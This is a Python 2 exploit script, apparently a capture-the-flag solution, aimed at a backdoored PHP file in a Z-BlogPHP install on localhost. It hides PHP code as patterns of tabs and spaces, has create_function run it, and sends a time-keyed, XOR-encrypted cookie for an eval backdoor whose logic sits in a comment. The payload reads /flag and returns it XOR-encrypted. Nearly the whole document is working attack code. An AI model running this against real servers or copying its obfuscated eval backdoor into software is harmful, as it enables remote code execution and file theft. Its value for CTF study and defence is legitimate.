import requests
import time
import random
import hashlib

def md5(data):
    return hashlib.md5(data).hexdigest()

url = "http://127.0.0.1/zb_system/function/c_system_runtime.php"
function = "create_function"
code = '''
/*
$key = time() % 0x100;
$cookie = md5((int)(time()/10));
var_dump($cookie);
$data = base64_decode($_COOKIE[$cookie]);
for($i = 0; $i<strlen($data); $i++){
$data[$i] = chr(ord($data[$i]) ^ $key);
}
eval($data);
*/
$flag=file_get_contents("/flag");
$flag=file("/flag")[0];
$key = time() % 0x100;
for($i=0;$i<strlen($flag);$i++){
$flag[$i]=chr(ord($flag[$i])^$key);
}
echo $flag;
'''

def encode(data):
    result = ""
    for i in data:
        char = "%02x" % (ord(i))
        tabs = [ord("\t") for i in range(int(char[0],16))]
        spaces = [ord(" ") for i in range(int(char[1],16))]
        hidden = spaces + tabs
        random.shuffle(hidden)
        result += "".join([chr(i) for i in hidden]) + "\x00"
    return result

def encrypt(data, key):
    result = ""
    for i in data:
        result += chr(ord(i) ^ key)
    return result


data = encode(function) + encode(code)
key =  md5(str(int(time.time())/10))
c = '''
$flag = 123;
var_dump($flag);
'''
'''
//$flag=file_get_contents("/flag");
//$flag=file("/flag")[0];
//var_dump($flag);
//$key = time() % 0x100;
//for($i=0;$i<strlen($flag);$i++){
//var_dump($flag[$i]);
//}
//var_dump($flag);
'''
xor_key = int(time.time()) % 0x100
cookies = {
       key:encrypt(c, xor_key).encode("base64").replace("\n",""),
}

content = requests.post(url, data=data, cookies=cookies).content
print encrypt(content, xor_key)
